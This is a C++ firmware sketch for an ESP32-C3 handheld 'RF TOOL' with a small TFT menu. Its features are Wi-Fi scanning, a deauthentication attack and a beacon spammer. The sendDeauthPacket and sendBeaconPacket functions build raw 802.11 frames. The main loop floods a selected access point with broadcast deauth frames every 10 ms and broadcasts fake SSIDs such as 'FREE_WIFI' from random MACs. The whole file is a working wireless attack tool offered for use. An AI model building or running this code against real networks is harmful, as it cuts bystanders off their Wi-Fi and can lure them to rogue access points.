/*
 * RF TOOL v5.2 - Wi-Fi Only (Bruce Style UI) FIXED
 * ESP32-C3 Supermini
 * - Fixed menu scrolling
 * - Fixed deauth activation
 * - Fixed beacon spammer
 */

#include <SPI.h>
#include <Adafruit_GFX.h>
#include <Adafruit_ST7735.h>
#include <WiFi.h>
#include <esp_wifi.h>

// ====================== Піни ======================
#define TFT_CS      5
#define TFT_DC      6
#define TFT_RST     7
#define TFT_MOSI    10
#define TFT_SCLK    8

#define BTN_UP      1
#define BTN_DOWN    20
#define BTN_SEL     3
#define BTN_BACK    0

// ====================== Кольори ======================
#define BG_COLOR        ST77XX_BLACK
#define HEADER_COLOR    ST77XX_CYAN
#define SELECTED_COLOR  ST77XX_YELLOW
#define TEXT_COLOR      ST77XX_WHITE
#define ALERT_COLOR     ST77XX_RED
#define SUCCESS_COLOR   ST77XX_GREEN
#define LINE_COLOR      ST77XX_BLUE

// ====================== Об'єкти ======================
Adafruit_ST7735 tft = Adafruit_ST7735(TFT_CS, TFT_DC, TFT_RST);

// ====================== Стани меню ======================
enum AppState {
  MAIN_MENU,
  WIFI_SCAN,
  WIFI_DEAUTH,
  WIFI_BEACON,
  SETTINGS
};

AppState currentState = MAIN_MENU;

// Головне меню
const char* mainMenuItems[] = {"Wi-Fi Scan", "Deauth", "Beacon Spam", "Settings"};
const uint8_t mainMenuSize = 4;
int8_t mainMenuIndex = 0;

// Налаштування
const char* beaconNames[] = {"Default", "AndroidAP", "iPhone"};
const uint8_t beaconCount = 3;
uint8_t beaconIndex = 0;
bool randomMAC = true;

// Wi-Fi дані
int apCount = 0;
String apList[30];
uint8_t apBSSID[30][6];
int apChannel[30];
int selectedAP = 0;

// Стани атак
bool deauthActive = false;
bool beaconActive = false;
unsigned long lastPacket = 0;
unsigned long packetCount = 0;
unsigned long lastUpdate = 0;

// ====================== Прототипи функцій ======================
void drawHeader(const char* title);
void drawMainMenu();
void drawWiFiScanList();
void drawWiFiDeauthScreen();
void drawBeaconScreen();
void drawSettingsScreen();
void drawButtonHints(const char* hints);
void handleNavigation();
void startWiFiScan();
void startDeauth();
void stopDeauth();
void startBeacon();
void stopBeacon();
void sendBeaconPacket(const char* ssid);
void sendDeauthPacket(uint8_t* bssid, int channel);

// ====================== Setup ======================
void setup() {
  Serial.begin(115200);
  delay(500);

  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_SEL, INPUT_PULLUP);
  pinMode(BTN_BACK, INPUT_PULLUP);

  SPI.begin(TFT_SCLK, -1, TFT_MOSI);

  tft.initR(INITR_MINI160x80);
  tft.setRotation(1);
  tft.fillScreen(BG_COLOR);
  tft.setTextWrap(false);

  tft.setTextColor(SUCCESS_COLOR);
  tft.setCursor(10, 20);
  tft.print("TFT OK!");
  
  tft.setTextColor(TEXT_COLOR);
  tft.setCursor(10, 35);
  tft.print("Wi-Fi init...");

  WiFi.mode(WIFI_STA);
  esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
  esp_wifi_set_ps(WIFI_PS_NONE);
  
  tft.setTextColor(SUCCESS_COLOR);
  tft.setCursor(10, 50);
  tft.print("Ready!");

  delay(1000);
  drawMainMenu();
}

// ====================== Головний цикл ======================
void loop() {
  handleNavigation();

  // Deauth attack
  if (currentState == WIFI_DEAUTH && deauthActive) {
    if (millis() - lastPacket >= 10) {
      lastPacket = millis();
      sendDeauthPacket(apBSSID[selectedAP], apChannel[selectedAP]);
      packetCount++;
      
      if (millis() - lastUpdate >= 500) {
        lastUpdate = millis();
        tft.fillRect(10, 85, 140, 20, BG_COLOR);
        tft.setCursor(10, 85);
        tft.setTextColor(TEXT_COLOR);
        tft.print("Packets: ");
        tft.print(packetCount);
      }
    }
  }

  // Beacon spam
  if (currentState == WIFI_BEACON && beaconActive) {
    if (millis() - lastPacket >= 50) {
      lastPacket = millis();
      
      String ssid;
      if (beaconIndex == 0) {
        ssid = "FREE_WIFI";
      } else if (beaconIndex == 1) {
        ssid = "AndroidAP";
      } else {
        ssid = "iPhone";
      }
      
      sendBeaconPacket(ssid.c_str());
      packetCount++;
      
      if (millis() - lastUpdate >= 500) {
        lastUpdate = millis();
        tft.fillRect(10, 85, 140, 20, BG_COLOR);
        tft.setCursor(10, 85);
        tft.setTextColor(TEXT_COLOR);
        tft.print("Beacons: ");
        tft.print(packetCount);
      }
    }
  }

  delay(5);
}

// ====================== Функції малювання ======================
void drawHeader(const char* title) {
  tft.fillRect(0, 0, 160, 15, HEADER_COLOR);
  tft.setTextColor(BG_COLOR);
  tft.setTextSize(1);
  tft.setCursor(3, 4);
  tft.print(title);
  tft.drawFastHLine(0, 15, 160, LINE_COLOR);
}

void drawButtonHints(const char* hints) {
  tft.fillRect(0, 145, 160, 15, BG_COLOR);
  tft.setTextColor(ST77XX_CYAN);
  tft.setTextSize(1);
  tft.setCursor(2, 148);
  tft.print(hints);
}

void drawMainMenu() {
  tft.fillScreen(BG_COLOR);
  drawHeader("RF TOOL v5.2");
  
  const char* icons[] = {"[S]", "[D]", "[B]", "[#]"};
  
  for (int i = 0; i < mainMenuSize; i++) {
    int y = 25 + i * 22;
    if (y > 140) break;
    
    if (i == mainMenuIndex) {
      tft.fillRoundRect(5, y-2, 150, 18, 4, SELECTED_COLOR);
      tft.setTextColor(BG_COLOR);
    } else {
      tft.setTextColor(TEXT_COLOR);
    }
    tft.setCursor(15, y);
    tft.print(icons[i]);
    tft.setCursor(40, y);
    tft.print(mainMenuItems[i]);
  }
  
  drawButtonHints("UP/DN:nav  SEL:enter");
}

void startWiFiScan() {
  tft.fillScreen(BG_COLOR);
  drawHeader("Wi-Fi Scanner");
  tft.setTextColor(TEXT_COLOR);
  tft.setCursor(10, 25);
  tft.print("Scanning...");
  
  apCount = WiFi.scanNetworks();
  if (apCount > 30) apCount = 30;
  
  for (int i = 0; i < apCount; i++) {
    apList[i] = WiFi.SSID(i);
    if (apList[i].length() == 0) apList[i] = "[Hidden]";
    apChannel[i] = WiFi.channel(i);
    memcpy(apBSSID[i], WiFi.BSSID(i), 6);
  }
  WiFi.scanDelete();
  
  selectedAP = 0;
  drawWiFiScanList();
}

void drawWiFiScanList() {
  tft.fillScreen(BG_COLOR);
  drawHeader("AP List");
  
  if (apCount == 0) {
    tft.setTextColor(ALERT_COLOR);
    tft.setCursor(10, 35);
    tft.print("No networks found");
    drawButtonHints("BACK:return");
    return;
  }
  
  tft.setTextColor(TEXT_COLOR);
  tft.setCursor(5, 20);
  tft.print("Found: ");
  tft.print(apCount);
  
  // Показуємо максимум 8 мереж
  int startIdx = 0;
  if (selectedAP > 7) startIdx = selectedAP - 7;
  
  for (int i = startIdx; i < apCount && i < startIdx + 8; i++) {
    int y = 30 + (i - startIdx) * 12;
    if (y > 140) break;
    
    if (i == selectedAP) {
      tft.fillRect(3, y-2, 154, 11, SELECTED_COLOR);
      tft.setTextColor(BG_COLOR);
    } else {
      tft.setTextColor(TEXT_COLOR);
    }
    tft.setCursor(5, y);
    
    String ssid = apList[i];
    if (ssid.length() > 14) ssid = ssid.substring(0, 12) + "..";
    tft.print(ssid);
    tft.print(" ch:");
    tft.print(apChannel[i]);
  }
  
  drawButtonHints("UP/DN:select  SEL:attack  BACK:back");
}

void drawWiFiDeauthScreen() {
  tft.fillScreen(BG_COLOR);
  drawHeader("Deauth Attack");
  
  if (apCount == 0) {
    tft.setTextColor(ALERT_COLOR);
    tft.setCursor(10, 35);
    tft.print("No AP selected!");
    drawButtonHints("BACK:return");
    return;
  }
  
  tft.setTextColor(ALERT_COLOR);
  tft.setCursor(10, 25);
  tft.print("Target:");
  tft.setTextColor(TEXT_COLOR);
  tft.setCursor(10, 40);
  String ssid = apList[selectedAP];
  if (ssid.length() > 18) ssid = ssid.substring(0, 16) + "..";
  tft.print(ssid);
  
  tft.setCursor(10, 55);
  tft.print("Channel: ");
  tft.print(apChannel[selectedAP]);
  
  tft.setTextColor(deauthActive ? SUCCESS_COLOR : TEXT_COLOR);
  tft.setCursor(10, 75);
  tft.print(deauthActive ? "ATTACK ACTIVE" : "SEL to start");
  
  if (deauthActive) {
    tft.setCursor(10, 90);
    tft.print("Packets: ");
    tft.print(packetCount);
  }
  
  drawButtonHints("SEL:start/stop  BACK:back");
}

void drawBeaconScreen() {
  tft.fillScreen(BG_COLOR);
  drawHeader("Beacon Spammer");
  
  tft.setTextColor(TEXT_COLOR);
  tft.setCursor(10, 25);
  tft.print("Mode: ");
  tft.print(beaconNames[beaconIndex]);
  
  tft.setCursor(10, 40);
  tft.print("Random MAC: ");
  tft.setTextColor(randomMAC ? SUCCESS_COLOR : ALERT_COLOR);
  tft.print(randomMAC ? "ON" : "OFF");
  
  tft.setTextColor(TEXT_COLOR);
  tft.setCursor(10, 60);
  tft.print("Status: ");
  if (beaconActive) {
    tft.setTextColor(SUCCESS_COLOR);
    tft.print("SPAMMING");
  } else {
    tft.setTextColor(TEXT_COLOR);
    tft.print("Idle");
  }
  
  if (beaconActive) {
    tft.setCursor(10, 80);
    tft.print("Beacons: ");
    tft.print(packetCount);
  }
  
  drawButtonHints("SEL:start/stop  UP/DN:mode  BACK:back");
}

void drawSettingsScreen() {
  tft.fillScreen(BG_COLOR);
  drawHeader("Settings");
  
  tft.setTextColor(TEXT_COLOR);
  tft.setCursor(10, 25);
  tft.print("Beacon Mode:");
  
  for (int i = 0; i < beaconCount; i++) {
    int y = 40 + i * 18;
    if (i == beaconIndex) {
      tft.fillRoundRect(10, y-2, 140, 16, 4, SELECTED_COLOR);
      tft.setTextColor(BG_COLOR);
    } else {
      tft.setTextColor(TEXT_COLOR);
    }
    tft.setCursor(20, y);
    tft.print(beaconNames[i]);
  }
  
  tft.setTextColor(TEXT_COLOR);
  tft.setCursor(10, 105);
  tft.print("Random MAC: ");
  tft.setTextColor(randomMAC ? SUCCESS_COLOR : ALERT_COLOR);
  tft.print(randomMAC ? "ON" : "OFF");
  
  drawButtonHints("SEL:toggle  UP/DN:mode  BACK:back");
}

// ====================== Функції атак ======================
void startDeauth() {
  deauthActive = true;
  packetCount = 0;
  lastUpdate = millis();
  esp_wifi_set_channel(apChannel[selectedAP], WIFI_SECOND_CHAN_NONE);
  drawWiFiDeauthScreen();
}

void stopDeauth() {
  deauthActive = false;
  drawWiFiDeauthScreen();
}

void startBeacon() {
  beaconActive = true;
  packetCount = 0;
  lastUpdate = millis();
  drawBeaconScreen();
}

void stopBeacon() {
  beaconActive = false;
  drawBeaconScreen();
}

void sendDeauthPacket(uint8_t* bssid, int channel) {
  uint8_t packet[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    0x00, 0x00, 0x01, 0x00
  };
  esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
}

void sendBeaconPacket(const char* ssid) {
  uint8_t packet[128];
  int ssidLen = strlen(ssid);
  
  packet[0] = 0x80;
  packet[1] = 0x00;
  packet[2] = 0x00;
  packet[3] = 0x00;
  
  for (int i = 4; i < 10; i++) packet[i] = 0xFF;
  
  if (randomMAC) {
    for (int i = 10; i < 16; i++) packet[i] = random(0, 255);
    packet[10] &= 0xFE;
  } else {
    uint8_t mac[6];
    WiFi.macAddress(mac);
    memcpy(packet + 10, mac, 6);
  }
  
  memcpy(packet + 16, packet + 10, 6);
  
  packet[22] = random(0, 255);
  packet[23] = random(0, 255);
  
  int pos = 24;
  
  for (int i = 0; i < 8; i++) packet[pos++] = random(0, 255);
  
  packet[pos++] = 0x64;
  packet[pos++] = 0x00;
  
  packet[pos++] = 0x21;
  packet[pos++] = 0x04;
  
  packet[pos++] = 0x00;
  packet[pos++] = ssidLen;
  memcpy(packet + pos, ssid, ssidLen);
  pos += ssidLen;
  
  packet[pos++] = 0x01;
  packet[pos++] = 0x08;
  packet[pos++] = 0x82;
  packet[pos++] = 0x84;
  packet[pos++] = 0x8B;
  packet[pos++] = 0x96;
  packet[pos++] = 0x24;
  packet[pos++] = 0x30;
  packet[pos++] = 0x48;
  packet[pos++] = 0x6C;
  
  packet[pos++] = 0x03;
  packet[pos++] = 0x01;
  packet[pos++] = 0x01;
  
  esp_wifi_80211_tx(WIFI_IF_STA, packet, pos, false);
}

// ====================== Навігація ======================
void handleNavigation() {
  static unsigned long lastPress = 0;
  if (millis() - lastPress < 180) return;
  
  bool up   = digitalRead(BTN_UP) == LOW;
  bool down = digitalRead(BTN_DOWN) == LOW;
  bool sel  = digitalRead(BTN_SEL) == LOW;
  bool back = digitalRead(BTN_BACK) == LOW;
  
  if (!up && !down && !sel && !back) return;
  lastPress = millis();
  
  // BACK - універсальна дія
  if (back) {
    if (currentState == MAIN_MENU) return;
    
    if (deauthActive) stopDeauth();
    if (beaconActive) stopBeacon();
    
    currentState = MAIN_MENU;
    drawMainMenu();
    return;
  }
  
  // Обробка для кожного стану
  switch (currentState) {
    case MAIN_MENU:
      if (up)   mainMenuIndex = (mainMenuIndex - 1 + mainMenuSize) % mainMenuSize;
      if (down) mainMenuIndex = (mainMenuIndex + 1) % mainMenuSize;
      if (up || down) drawMainMenu();
      
      if (sel) {
        switch (mainMenuIndex) {
          case 0:
            startWiFiScan();
            currentState = WIFI_SCAN;
            break;
          case 1:
            if (apCount == 0) {
              startWiFiScan();
            }
            currentState = WIFI_DEAUTH;
            drawWiFiDeauthScreen();
            break;
          case 2:
            currentState = WIFI_BEACON;
            drawBeaconScreen();
            break;
          case 3:
            currentState = SETTINGS;
            drawSettingsScreen();
            break;
        }
      }
      break;
      
    case WIFI_SCAN:
      if (apCount == 0) break;
      if (up)   selectedAP = (selectedAP - 1 + apCount) % apCount;
      if (down) selectedAP = (selectedAP + 1) % apCount;
      if (up || down) drawWiFiScanList();
      
      if (sel) {
        currentState = WIFI_DEAUTH;
        drawWiFiDeauthScreen();
      }
      break;
      
    case WIFI_DEAUTH:
      if (sel) {
        if (apCount == 0) {
          tft.fillScreen(BG_COLOR);
          drawHeader("Error");
          tft.setTextColor(ALERT_COLOR);
          tft.setCursor(10, 35);
          tft.print("No AP selected!");
          delay(1500);
          currentState = MAIN_MENU;
          drawMainMenu();
        } else {
          if (deauthActive) stopDeauth();
          else startDeauth();
        }
      }
      break;
      
    case WIFI_BEACON:
      if (up)   { 
        beaconIndex = (beaconIndex - 1 + beaconCount) % beaconCount; 
        drawBeaconScreen(); 
      }
      if (down) { 
        beaconIndex = (beaconIndex + 1) % beaconCount; 
        drawBeaconScreen(); 
      }
      if (sel) {
        if (beaconActive) stopBeacon();
        else startBeacon();
        drawBeaconScreen();
      }
      break;
      
    case SETTINGS:
      if (up)   { 
        beaconIndex = (beaconIndex - 1 + beaconCount) % beaconCount; 
        drawSettingsScreen(); 
      }
      if (down) { 
        beaconIndex = (beaconIndex + 1) % beaconCount; 
        drawSettingsScreen(); 
      }
      if (sel) {
        randomMAC = !randomMAC;
        drawSettingsScreen();
      }
      break;
  }
}